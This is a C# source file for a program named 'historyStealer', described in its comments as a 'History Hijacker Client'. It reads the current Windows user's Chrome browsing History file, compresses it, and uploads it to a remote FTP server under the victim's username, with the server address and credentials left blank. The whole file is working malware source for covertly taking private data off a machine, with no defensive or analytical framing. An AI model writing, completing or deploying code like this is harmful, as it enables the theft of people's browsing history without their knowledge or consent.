using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace historyStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            HClient dumpster = new HClient("", "", "");
            string path = @"c:\Users\"+Environment.UserName+@"\AppData\Local\Google\Chrome\User Data\Default\";
            dumpster.ZipFile(path+"History");
            dumpster.UploadFile(path + "His-story");
            return;
        }
    }

    // History Hijacker Client
    // Methods to compress the history file
    // And Upload to remote ftp server

    public class HClient
    {

        private string _remoteHost;
        private string _remoteUser;
        private string _remotePass;

        public HClient(string remoteHost, string remoteUser, string remotePassword)
        {
            _remoteHost = remoteHost;
            _remoteUser = remoteUser;
            _remotePass = remotePassword;
        }

        public void ZipFile(string filePath)
        {
            string filename = Path.GetFileName(filePath);
            byte[] fileContents = File.ReadAllBytes(filePath);

            string fileName = @"c:\Users\" + Environment.UserName + @"\AppData\Local\Google\Chrome\User Data\Default\His-story";
            using (FileStream f2 = new FileStream(fileName, FileMode.Create))
            using (GZipStream gz = new GZipStream(f2, CompressionMode.Compress, false))
            {
                gz.Write(fileContents, 0, fileContents.Length);
            }
            return;
        }

        public void UploadFile(string FullPathFilename)
        {
            
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(_remoteHost + Environment.UserName+".rar");
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(_remoteUser, _remotePass);

            byte[] compFileContents = File.ReadAllBytes(FullPathFilename);
            request.ContentLength = compFileContents.Length;

            Stream requestStream = request.GetRequestStream();
            requestStream.Write(compFileContents, 0, compFileContents.Length);

            FtpWebResponse response = (FtpWebResponse)request.GetResponse();

            response.Close();
            requestStream.Close();
        }

    }	

}
